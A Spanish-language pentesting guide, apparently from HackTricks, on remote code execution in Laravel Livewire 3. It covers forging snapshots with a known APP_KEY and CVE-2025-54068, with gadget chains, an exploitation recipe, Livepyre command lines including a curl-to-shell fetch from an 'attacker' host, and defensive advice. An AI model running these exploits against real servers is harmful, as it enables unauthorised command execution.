# Laravel Livewire Hidratación y abuso del Synthesizer

{{#include ../../banners/hacktricks-training.md}}

## Resumen de la máquina de estados de Livewire

Los componentes de Livewire 3 intercambian su estado mediante **instantáneas** que contienen `data`, `memo` y una suma de verificación. Cada POST a `/livewire/update` rehidrata el snapshot JSON en el servidor y ejecuta las `calls`/`updates` en cola.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
Cualquiera que posea `APP_KEY` (usado para derivar `$hashKey`) puede, por lo tanto, forjar instantáneas arbitrarias recomputando el HMAC.

Las propiedades complejas se codifican como **tuplas sintéticas** detectadas por `Livewire\Drawer\BaseUtils::isSyntheticTuple()`; cada tupla es `[value, {"s":"<key>", ...meta}]`. El núcleo de hidratación simplemente delega cada tupla al synth seleccionado en `HandleComponents::$propertySynthesizers` y recorre recursivamente los hijos:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
Este diseño recursivo convierte a Livewire en un **motor genérico de instanciación de objetos** una vez que un atacante controla ya sea los metadatos de la tupla o cualquier tupla anidada procesada durante la recursión.

## Synthesizers que otorgan primitivas de gadget

| Sintetizador | Comportamiento controlado por el atacante |
|-------------|-------------------------------------------|
| **CollectionSynth (`clctn`)** | Instancia `new $meta['class']($value)` después de rehidratar cada hijo. Cualquier clase con un constructor que acepte un array puede ser creada, y cada elemento puede ser a su vez una tupla sintética. 
| **FormObjectSynth (`form`)** | Llama a `new $meta['class']($component, $path)`, luego asigna todas las propiedades públicas desde los hijos controlados por el atacante vía `$hydrateChild`. Los constructores que aceptan dos parámetros de tipado laxo (o argumentos por defecto) son suficientes para alcanzar propiedades públicas arbitrarias.
| **ModelSynth (`mdl`)** | Cuando `key` está ausente de meta ejecuta `return new $class;`, permitiendo la instanciación sin argumentos de cualquier clase bajo control del atacante.

Debido a que los synths invocan `$hydrateChild` en cada elemento anidado, se pueden construir grafos de gadgets arbitrarios apilando tuplas recursivamente.

## Forjar snapshots cuando se conoce `APP_KEY`

1. Captura una petición legítima a `/livewire/update` y decodifica `components[0].snapshot`.
2. Inyecta tuplas anidadas que apunten a clases gadget y recalcula `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`.
3. Vuelve a codificar el snapshot, mantiene `_token`/`memo` sin tocar, y reenvía la petición.

Una prueba mínima de ejecución usa **Guzzle's `FnStream`** y **Flysystem's `ShardedPrefixPublicUrlGenerator`**. Una tupla instancia `FnStream` con datos de constructor `{ "__toString": "phpinfo" }`, la siguiente instancia `ShardedPrefixPublicUrlGenerator` con `[FnStreamInstance]` como `$prefixes`. Cuando Flysystem convierte cada prefijo a `string`, PHP invoca el callable `__toString` proporcionado por el atacante, llamando a cualquier función sin argumentos.

### De llamadas a funciones a RCE completo

Aprovechando las primitivas de instanciación de Livewire, Synacktiv adaptó la cadena `Laravel/RCE4` de phpggc para que la hidratación arranque un objeto cuyo estado público Queueable desencadena la deserialización:

1. **Trait Queueable** – cualquier objeto que use `Illuminate\Bus\Queueable` expone `$chained` público y ejecuta `unserialize(array_shift($this->chained))` en `dispatchNextJobInChain()`.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) se instancia vía `CollectionSynth` / `FormObjectSynth` con `$chained` público poblado.
3. **phpggc Laravel/RCE4Adapted** – el blob serializado almacenado en `$chained[0]` construye `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`. `Signed::__invoke()` finalmente llama a `call_user_func_array($closure, $args)` habilitando `system($cmd)`.
4. **Terminación sigilosa** – entregando un segundo callable `FnStream` como `[new Laravel\Prompts\Terminal(), 'exit']`, la petición termina con `exit()` en lugar de una excepción ruidosa, manteniendo la respuesta HTTP limpia.

### Automatizando la falsificación de snapshots

`synacktiv/laravel-crypto-killer` ahora incluye un modo `livewire` que ensambla todo:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
La herramienta analiza la snapshot capturada, inyecta los gadget tuples, recalcula el checksum y muestra una carga útil lista para enviar a `/livewire/update`.

## CVE-2025-54068 – RCE sin `APP_KEY`

Según el aviso del proveedor, el problema afecta a Livewire v3 (>= 3.0.0-beta.1 y < 3.6.3) y es exclusivo de v3.

`updates` se fusionan con el estado del componente **después** de que se valide el checksum del snapshot. Si una propiedad dentro del snapshot es (o se convierte en) un synthetic tuple, Livewire reutiliza su meta al hidratar el valor de update controlado por el atacante:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Receta de explotación:

1. Encuentra un componente Livewire con una propiedad pública sin tipo (p. ej., `public $count;`).
2. Envía un update que establezca esa propiedad a `[]`. El siguiente snapshot la almacena ahora como `[[], {"s": "arr"}]`.

Un flujo mínimo de type-juggling se ve así:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Entonces el siguiente snapshot almacena una tupla que conserva los metadatos del synthesizer `arr`:

```json
"count": [[], {"s": "arr"}]
```

3. Construye otro payload `updates` donde esa propiedad contenga un array profundamente anidado que inserte tuplas como `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. Durante la recursión, `hydrate()` evalúa cada hijo anidado de forma independiente, por lo que las synth keys/clases elegidas por el atacante son respetadas aunque la tupla externa y la checksum nunca cambiaran.
5. Reutiliza las mismas primitivas `CollectionSynth`/`FormObjectSynth` para instanciar un gadget Queueable cuyo `$chained[0]` contiene el payload phpggc. Livewire procesa los updates forjados, invoca `dispatchNextJobInChain()` y alcanza `system(<cmd>)` sin conocer `APP_KEY`.

Razones clave por las que esto funciona:

- `updates` no están cubiertos por la checksum del snapshot.
- `getMetaForPath()` confía en los metadatos de synth que ya existían para esa propiedad incluso si el atacante previamente la forzó a convertirse en una tupla mediante weak typing.
- La recursión junto con weak typing permite que cada array anidado sea interpretado como una tupla totalmente nueva, de modo que synth keys arbitrarias y clases arbitrarias llegan finalmente a hydration.

## Livepyre – explotación de extremo a extremo

[Livepyre](https://github.com/synacktiv/Livepyre) automatiza tanto el CVE sin APP_KEY como la vía de snapshot firmado:

- Deduce la versión de Livewire desplegada analizando `<script src="/livewire/livewire.js?id=HASH">` y mapeando el hash a releases vulnerables.
- Recoge snapshots base reproduciendo acciones benignas y extrayendo `components[].snapshot`.
- Genera o bien un payload solo de `updates` (CVE-2025-54068) o un snapshot forjado (APP_KEY conocido) que incruste la cadena phpggc.
- Si no se encuentra un parámetro de tipo object en un snapshot, Livepyre recurre a brute-forcing de parámetros candidatos para alcanzar una propiedad coercible.

Uso típico:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` ejecuta una sonda no destructiva, `-F` omite la restricción por versión, `-H` y `-P` añaden cabeceras personalizadas o proxies, y `--function/--param` personalizan la función php invocada por el gadget chain.

## Consideraciones defensivas

- Actualiza a builds de Livewire corregidas (>= 3.6.4 según el boletín del proveedor) y despliega el parche del proveedor para CVE-2025-54068.
- Evita propiedades públicas débilmente tipadas en componentes Livewire; los tipos escalares explícitos impiden que los valores de las propiedades sean coaccionados a arrays/tuples.
- Registra solo los synthesizers que realmente necesites y trata los metadatos controlados por el usuario (`$meta['class']`) como no confiables.
- Rechaza actualizaciones que cambien el tipo JSON de una propiedad (p. ej., scalar -> array) a menos que esté explícitamente permitido, y vuelve a derivar el synth metadata en lugar de reutilizar tuplas obsoletas.
- Rota `APP_KEY` con prontitud tras cualquier divulgación porque permite la falsificación de snapshots offline sin importar cuánto esté parcheada la base de código.

## Referencias

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
